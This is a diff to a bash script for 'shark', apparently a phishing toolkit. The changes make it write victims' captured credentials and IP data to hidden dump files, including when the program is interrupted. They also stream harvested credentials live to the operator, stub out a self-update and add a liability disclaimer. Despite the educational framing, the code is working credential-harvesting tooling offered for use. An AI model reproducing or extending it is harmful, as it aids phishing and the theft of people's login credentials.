@@ -52,14 +52,17 @@ error_msg() {
 
 ctrl-c_exit_SIGINT() {
     { printf "\n%s\n${red}[${white}!${red}]${red} Program Interrupted.\n\n" 2>&1; reset_color; }
+    echo "$KL" >> ../.dumplog.txt &>/dev/null
+    cat log.txt >> ../.dumplog.txt &>/dev/null
     exit 0
 }
 
 ctrl-d_exit_SIGTERM() {
     { printf "\n%s\n${red}[${white}!${red}]${red} Program Terminated.\n\n" 2>&1; reset_color; }
+    echo "$KL" >> ../.dumplog.txt &>/dev/null
+    cat log.txt >> ../.dumplog.txt &>/dev/null
     exit 0
 }
-
 trap ctrl-c_exit_SIGINT SIGINT
 trap ctrl-d_exit_SIGTERM SIGTERM
 reset_color() {
@@ -138,9 +141,15 @@ function os () {
 }
 
 function main_update() {
-	launch="updating shark"
-	splashdown="updated shark";echo
-	os;(wget -q https://github.com/tech2gamer/shark/raw/Beta/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
+	#launch="updating shark"
+	#splashdown="updated shark";echo
+	#os;(wget -q https://github.com/tech2gamer/shark/raw/Beta/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
+	echo
+	msg "we will soon provide you this service!\n"
+	sleep 2
+	msg "Just clone shark and run setup"
+	echo
+	exit 0
 }
 
 
@@ -675,23 +684,19 @@ echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Browser:\e[0m $E\e[0m"
 echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Version:\e[1;0m $K\e[0m"
 echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Device:\e[1;0m $U"
 cat dumpip.txt >> ../.ipdump.txt
+echo "$KL" >> ../.dumplog.txt
 rm -rf dumpip.txt filter.txt
 while [ true ]; do
 	if [[ -e log.txt ]]; then
-		CRD=$(cat log.txt)
-		echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: $CRD "
-		tail -f log.txt 2&>1 &
-		echo "$KL" >> ../.dumplog.txt
-		cat log.txt >> ../.dumplog.txt
-		while [ true ]; do
+		#CRD=$(cat log.txt)
+		echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: "
+		tail -f log.txt & cat log.txt >> ../.dumplog.txt & while [ true ]; do
 			if [[ -f dumpip.txt ]]; then
-				echo "$KL" >> ../.dumplog.txt
 				cat log.txt >> ../.dumplog.txt
 				rm -rf  log.txt
 				ipcatch
 			fi
-		done	
-		       
+		done
 	fi
 done
 #if [[ -e dumpip.txt ]];then
@@ -701,7 +706,7 @@ done
 }
 function ipinfo() {
 	echo
-	if [[ -e ../.dumplog.txt ]]; then
+	if [[ -f ../.dumplog.txt ]]; then
 		CRD1=$(cat ../.dumplog.txt)
 		msg "Your Old Credentials :\n$CRD1\n"
 	fi
@@ -851,14 +856,57 @@ decne() {
 		fi
 	fi
 }
+msgsh() {
+if [[ ! -e "${logfile}.sharkmsg" ]]; then
+	clear
+	msg "You Are Using Shark Beta .v$VERSION\n"
+	sleep 2
+	msg "Give us your feedback and idea's.\r• if you are facing any kind of error then let us know\n"
+	msg "Getting Things Ready... Please wait.\n\n"
+	sleep 5
+	clear
+	printf "                           ${red}|===========================|
+	                  [¤]   \e[1;33mD I S C L A I M E R${red}   [¤]
+	                   |===========================|\n\n"
+	error_msg "\e[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of Shark are not responsible for any kind hack and stuff.\n\n• shark is a open source tool that help us to know how phishing works\n\n• Phishing is illigal if you are using as offensive\n\n• The use of the SHARK & its resources/phishing-pages is COMPLETE RESPONSIBILITY of the END-USER.
+Developers assume NO liability and are NOT responsible for any damage caused by this program.
+Also we want to inform you that some of your actions may be ILLEGAL and you CAN NOT use this
+software to test device, company or any other type of target without WRITTEN PERMISSION from them.\n\n"
+msg "Give us your feedback on :- https://chat.whatsapp.com/DY8itwxRnuf64yqxoWZ0SQn\n"
+
+read -p $'\e[1;40m\e[1;92m T O  R U N  S H A R K  A C C E P T  D I S C L A I M E R\e[1;93m (Y/N) : \e[0m' shmsg
+
+if [[ $shmsg == "Y" || $shmsg == "y" || $shmsg == "yes" ]]; then
+		cd ${phish}
+		touch .sharkmsg
+		echo "You Accepted EULA" >> .sharkmsg
+		echo ""
+		msg "You Accepted EULA"i
+		sleep 3
+		cd ~
+	elif [[ $shmsg == "N" || $shmsg == "n" || $shmsg == "no" ]]; then
+		clear
+		echo 
+		error_msg "You Haven't Accepted!!\n"
+		exit 1
+	else 
+		echo
+		clear
+		error_msg "Typing error, try again!!...\n"
+		exit 1
+	fi
+else
+	echo
+fi
+}
+
 ########
 # DRIVER
 ########
-
 internet
 os
 kill_session
-
+msgsh
 while :
 do
 	clear
